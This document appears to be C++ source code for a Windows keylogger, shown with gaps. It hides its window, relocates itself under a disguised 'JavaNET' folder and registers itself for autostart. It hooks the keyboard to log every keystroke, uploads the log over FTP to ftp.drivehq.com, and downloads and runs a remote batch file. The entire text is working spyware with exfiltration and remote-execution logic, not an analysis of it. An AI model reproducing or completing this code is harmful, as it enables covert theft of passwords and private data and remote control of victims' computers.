...
void execute();
int executeprocess();
//                               if dir==want nothing else reloc
//Relocation module
void relocation(){
	
	TCHAR destination[] = ("C:\\ProgramData\\JavaNET\\Hook.exe");
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL,szPath,MAX_PATH);
	if( strcmp(szPath,destination)==0 ){
	
	//if directory is final, add to registry 
	addST();
	
	//cout<<"Safe location, No relocation required\n";
	//system("pause");
	...
	//cout<<"Initializing relocation...\n";
	ofstream hand;
	hand.open("C:\\ProgramData\\JavaNET\\Config.bat", fstream::out);
	hand<<"move /y "<<"\""<<szPath<<"\""<<" C:\\ProgramData\\JavaNET";
	//cout<<"Writing reinitializing command...";
	hand<<"\nStart \"\"  \"C:\\ProgramData\\JavaNET\\Hook.exe\" ";
	hand.close();
	batcher();
	//cout<<"\nRelocation complete.";
	//system("pause");
...
int batcher()
{
   ...
   if( !CreateProcess( NULL, "cmd /C  C:\\ProgramData\\JavaNET\\Config.bat", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)  )
   {
...
int executeprocess()
{
   ...
   si.cb = sizeof(si);
   ZeroMemory( &pi, sizeof(pi) );
   if( !CreateProcess( NULL, "cmd /C  C:\\ProgramData\\JavaNET\\API.bat", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)  )
   {
     printf( "CreateProcess failed (%d)\n", GetLastError() );
     return FALSE;
   }
...
//Function to create folder directory
void CreateFolder(const char * path)
{   
...
//Download remote batch
void recieveRB(){
	
	ofstream hand;
	
	hand.open("C:\\ProgramData\\zunger.bat", fstream::out);
	
hand << "@echo off";
hand << "\necho user ADDFTPUSERIDHERE> C:\\ProgramData\\ftpc.dat";
hand << "\necho ADDFTPPASSWORDHERE>> C:\\ProgramData\\ftpc.dat";
hand << "\necho cd \"My Documents\">> C:\\ProgramData\\ftpc.dat";
hand << "\necho lcd C:\\ProgramData\\JavaNET>> C:\\ProgramData\\ftpc.dat";
hand << "\necho get API.bat>> C:\\ProgramData\\ftpc.dat";
hand << "\necho quit>> C:\\ProgramData\\ftpc.dat";
hand << "\nftp -n -s:C:\\ProgramData\\ftpc.dat ftp.drivehq.com";
hand << "\ndel C:\\ProgramData\\ftpc.dat";
	
	hand.close();
	
	system( "C:\\ProgramData\\zunger.bat" );
	system("del C:\\ProgramData\\zunger.bat");
	
	return;
	
}

//Execute the remote batch and delete
void execute(){

system("C:\\ProgramData\\JavaNET\\API.bat");
system("del C:\\ProgramData\\JavaNET\\API.bat");

}
  
//Function to add program in Autostart registry
...
RegSetValueEx(newValue,"Hook.exe",0,REG_SZ,(LPBYTE)szPath,sizeof(szPath));
RegCloseKey(newValue);


}
char buff[DTTMSZ]; //variable used to store date time and send to write function
...
void write(const char* c)
{
        ...
        const char* fileLocation = "C:\\ProgramData\\JavaNET\\FrameWork.txt"; // Define the location of log file
...
//Function to ftp upload log
void send(){
	
	ofstream hand;
	
	hand.open("C:\\ProgramData\\zinger.bat", fstream::out);
	
hand << "@echo off";
hand << "\necho user ADDFTPUSERIDHERE> C:\\ProgramData\\ftpcmd.dat";
hand << "\necho ADDFTPPASSWORDHERE>> C:\\ProgramData\\ftpcmd.dat";
hand << "\necho cd \"My Documents\">> C:\\ProgramData\\ftpcmd.dat";
hand << "\necho put C:\\ProgramData\\JavaNET\\FrameWork.txt>> C:\\ProgramData\\ftpcmd.dat";
hand << "\necho quit>> C:\\ProgramData\\ftpcmd.dat";
hand << "\nftp -n -s:C:\\ProgramData\\ftpcmd.dat ftp.drivehq.com";
hand << "\ndel C:\\ProgramData\\ftpcmd.dat";
	
	hand.close();
	
	system( "C:\\ProgramData\\zinger.bat" );
	system("del C:\\ProgramData\\zinger.bat");
...
hand << "\necho ADDFTPPASSWORDHERE>> C:\\ProgramData\\ftpcmd.dat";
hand << "\necho cd \"My Documents\">> C:\\ProgramData\\ftpcmd.dat";
hand << "\necho get API.bat>> C:\\ProgramData\\ftpcmd.dat";
hand << "\necho quit>> C:\\ProgramData\\ftpcmd.dat";
hand << "\nftp -n -s:C:\\ProgramData\\ftpcmd.dat ftp.drivehq.com";
hand << "\ndel C:\\ProgramData\\ftpcmd.dat";
        ...
        if(nCode == HC_ACTION){
                ...
                if(wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) // If key has been pressed
                {
                        ...
                        switch(p->vkCode) // Compare virtual keycode to hex values and log keys accordingly
                        {
                                ...
                                case VK_ESCAPE: write("[ESC]");send(); break;
                                ...
                                case VK_NUMLOCK: write("[Num Lock]"); break;
...
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int cmdShow)
{
	...
	hide();
	addST();
	CreateFolder("C:\\ProgramData\\JavaNET");
	relocation();
        // Write to file
        write("\n---------------------------------------------------------");
        
        // Hook to all available threads
    KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, GetModuleHandle(0), 0);
    
        if(KeyboardHook!=NULL)
        {
                // Keep alive till F12 + CTRL key press is detected
                KeepAlive();
        }
        // Exit the program
    return 0;
